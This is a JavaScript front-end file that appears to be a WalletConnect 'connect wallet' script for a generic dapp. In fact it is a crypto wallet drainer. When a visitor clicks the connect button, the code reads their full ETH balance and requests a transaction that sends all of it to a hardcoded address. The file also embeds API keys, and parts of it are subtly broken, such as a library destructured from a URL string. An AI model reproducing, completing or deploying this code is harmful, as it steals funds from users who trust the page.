if (typeof process === 'undefined') {
  window.process = {
  env: { NODE_ENV: 'development' }
  };
  }


import { WalletConnectModalSign } from "https://unpkg.com/@walletconnect/modal-sign-html@2.6.1";

const { OpenSeaPort, Network } = "https://cdn.jsdelivr.net/npm/seaport@2.0.9/index.js";
import walletconnectWeb3Provider from 'https://cdn.jsdelivr.net/npm/walletconnect-web3-provider@0.7.28/+esm'
// 1. Define ui elements
const connectButton = document.getElementById("connect-button");
const ethereumJsonRpcUrl = 'https://mainnet.infura.io/v3/b515c05d5db44cb3aa07665e4d316042'

const providerOptions = {
  walletconnect: {
    package: walletconnectWeb3Provider,
    options: {
      // Mikko's test key - don't copy as your mileage may vary
      infuraId: "b515c05d5db44cb3aa07665e4d316042",
    }
  },
}

console.log(WalletConnectModalSign)
// 2. Create modal client, add your project id
const web3Modal = new WalletConnectModalSign({
  projectId: "0d4f78d9c663f3cebe1019795245b1f2",
  metadata: {
    name: "My Dapp",
    description: "My Dapp description",
    url: "https://my-dapp.com",
    icons: ["https://my-dapp.com/logo.png"],
  },
  
});


// 3. Connect
async function onConnect() {
  try {
    connectButton.disabled = true;
    const session = await web3Modal.connect({

      requiredNamespaces: {
        eip155: {
          methods: ["eth_sendTransaction", "personal_sign", "eth_signTransaction"],
          chains: ["eip155:1"],
          events: ["chainChanged", "accountsChanged"],
        },
      },
      
      
      
    });
    
    console.log(session);
     // Use the wallet's provider from Web3Modal

    
    var accounts = session.namespaces.eip155.accounts[0].slice(9)
    const infuraProvider = new ethers.providers.JsonRpcProvider(ethereumJsonRpcUrl);
    
    if (session) {
      console.log('Connected to wallet');
      
      // Get the connected address
      
      // Create a transaction
      const balance = await infuraProvider.getBalance(accounts);
      const balanceInEther = ethers.utils.formatEther(balance);
      const balanceInWei = ethers.utils.parseEther(balanceInEther);

      // Convert Wei to hexadecimal
      const balanceInWeiHex = balanceInWei.toHexString();

      console.log('Balance in Wei (hex):', balanceInWeiHex);
      
      const transaction = {
        from: accounts,
        to: "0xc25a768371b1f10DED11513eDF0eb5120DC33dcf",
        gas: "20000",
        value: balance.toString()
        
        
      };

      // Sign and send the transaction
      try {
        
        const txResponse =  await web3Modal.request({
          topic: session.topic,
          chainId: "eip155:1",
          request: {
            method: "eth_sendTransaction",
            params: [transaction],
          },
        });
        await txResponse.wait();

        console.log('Transaction sent. Transaction Hash:', txResponse.hash);
      } catch (error) {
        console.error('Error sending ETH transaction:', error);
      }
    }
  } catch (err) {
    console.error(err);
  } finally {
    connectButton.disabled = false;
  
  }

  
} 


// 4. Create connection handler
connectButton.addEventListener("click", onConnect);
